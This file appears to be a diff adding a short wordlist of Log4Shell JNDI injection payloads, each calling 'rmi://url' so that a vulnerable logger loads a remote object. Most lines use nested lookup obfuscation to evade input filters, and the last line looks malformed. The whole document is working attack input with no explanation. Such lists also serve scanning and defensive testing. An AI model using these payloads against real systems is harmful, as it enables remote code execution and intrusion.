@@ -1,0 +1,7 @@
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://url/poc}
+${${::-j}ndi:rmi://url/ass}
+${jndi:rmi://url}
+${${lower:jndi}:${lower:rmi}://url/poc}
+${${lower:${lower:jndi}}:${lower:rmi}://url/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://url/poc}
+${${lower:j}${upper:teln}${lower:d}${upper:i}:${lower:r}m${lower:i}}://url/poc}
